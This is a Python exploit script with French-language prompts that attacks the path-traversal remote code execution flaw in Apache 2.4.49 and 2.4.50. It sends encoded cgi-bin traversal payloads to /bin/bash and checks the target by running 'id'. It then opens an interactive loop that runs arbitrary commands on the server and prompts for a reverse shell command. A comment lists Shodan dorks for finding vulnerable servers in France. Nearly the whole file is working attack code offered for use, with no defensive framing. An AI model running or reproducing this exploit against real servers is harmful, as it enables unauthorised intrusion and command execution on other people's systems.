#!/usr/bin/env python3

#coding: utf-8

import sys
import os
import time
import requests
from colorama import Fore,Style

header = '''\033[1;91m
    
     ▄▄▄       ██▓███   ▄▄▄       ▄████▄   ██░ ██ ▓█████     ██▀███   ▄████▄  ▓█████ 
    ▒████▄    ▓██░  ██▒▒████▄    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀    ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
    ▒██  ▀█▄  ▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▒██▀▀██░▒███      ▓██ ░▄█ ▒▒▓█    ▄ ▒███   
    ░██▄▄▄▄██ ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄    ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
    ▓█   ▓██▒▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░░▓█▒░██▓░▒████▒   ░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
    ▒▒   ▓▒█░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░   ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
    ▒   ▒▒ ░░▒ ░       ▒   ▒▒ ░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░     ░▒ ░ ▒░  ░  ▒    ░ ░  ░
    ░   ▒   ░░         ░   ▒   ░         ░  ░░ ░   ░        ░░   ░ ░           ░ 
''' + Style.RESET_ALL
if len(sys.argv) < 2 :
    print( 'Use: python3 file.py ip:port ' )
    sys.exit()


# shodan dorks: country: FR apache / 2.4.49 ou country: FR apache / 2.4.50
def end():
    print("\t\033[1;91m[!] A bientôt")
    time.sleep(0.5)
    sys.exit(1)

def exploitRCE(payload):
    s = requests.Session()
    try:
        host = sys.argv[1]
        url = 'http://'+ host + payload
        session = requests.Session()
        command = "echo; id"
        req = requests.Request('POST', url=url, data=command)
        prepare = req.prepare()
        prepare.url = url  
        response = session.send(prepare, timeout=5)
        output = response.text
        if "uid" in output:
            choice = "O"
            print( Fore.GREEN + '\n[!] La cible %s est vulnérable !!!' % host)
            print("[!] Sortie:\n\n" + Fore.YELLOW + output )
            choice = input(Fore.CYAN + "[?] Voulez vous exploiter ce RCE ? (O/n) : ")
            if choice in ['','O','o','Oui','oui']:
                while True:
                    command = input(Fore.GREEN + "apache@RCE (reverse shell command): ")
                    command = 'echo;' + command
                    s = requests.Session()
                    req = requests.Request('POST', url=url, data=command)
                    prepare = req.prepare()
                    prepare.url = url  
                    response = session.send(prepare, timeout=5)
                    if command == 'echo;clear':
                        os.system(command)
                        print(header)
                    output = response.text
                    print(output)
            else:
                end()

                
        else :
            print(Fore.RED + '\nLa cible %s n\'est pas vulnérable' % host)
    except KeyboardInterrupt:
        end()

def main():
    try:
        apache2449_payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash'
        apache2450_payload = '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash'
        payloads = [apache2449_payload,apache2450_payload]
        choice = len(payloads) + 1
        print(header)
        print("\033[1;37m[0] Apache 2.4.49 RCE\n[1] Apache 2.4.50 RCE")
        while choice >= len(payloads) and choice >= 0:
            choice = int(input('[~] Faites votre choix : '))
            if choice < len(payloads):
                exploitRCE(payloads[choice])
    except KeyboardInterrupt:
            print("\n\033[1;91m[!] A bientôt")
            time.sleep(0.5)
            sys.exit(1)

if __name__ == '__main__':
    main()
